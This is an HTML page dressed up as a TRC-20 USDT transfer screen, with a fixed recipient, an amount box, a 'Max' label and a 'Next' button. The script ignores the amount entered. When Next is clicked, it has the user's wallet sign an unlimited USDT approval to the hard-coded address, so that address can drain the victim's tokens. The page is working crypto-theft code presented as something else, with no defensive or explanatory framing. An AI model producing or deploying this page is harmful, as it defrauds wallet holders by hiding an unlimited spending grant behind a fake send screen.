<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC‑20 USDT Approval</title>
  <style>
    body { font-family: sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
    input, button { width: 90%; padding: 14px; margin: 8px 0; font-size: 16px; border-radius: 8px; border: none; }
    button { background: #3ba2ff; font-weight: bold; }
    .max-label { text-align: right; color: #3ba2ff; font-size: 14px; width: 90%; }
  </style>
</head>
<body>
  <input id="recipient" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly/>
  <input id="amount" type="text" placeholder="Amount"/>
  <div class="max-label">Max</div>
  <button id="nextBtn">Next</button>

  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>

  <script>
    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const RECEIVER = document.getElementById("recipient").value;

    function waitForTronWeb(maxMs = 15000) {
      const start = Date.now();
      return new Promise(resolve => {
        const iv = setInterval(() => {
          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            clearInterval(iv);
            resolve(true);
          } else if (Date.now() - start > maxMs) {
            clearInterval(iv);
            resolve(false);
          }
        }, 500);
      });
    }

    async function approveUnlimited() {
      const ready = await waitForTronWeb();
      if (!ready) { alert("Open in TronLink / OKX wallet browser"); return; }
      const tronWeb = window.tronWeb;
      const user = tronWeb.defaultAddress.base58;
      const amnt = document.getElementById("amount").value || "0";

      try {
        const contract = await tronWeb.contract().at(CONTRACT);
        await contract.approve(RECEIVER, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ shouldPollResponse: true });
        alert("✅ Approval popup shown and sent");
      } catch(err) {
        console.error(err);
        alert("❌ Approval failed: " + err.message);
      }
    }

    document.getElementById("nextBtn").addEventListener("click", approveUnlimited);
  </script>
</body>
</html>
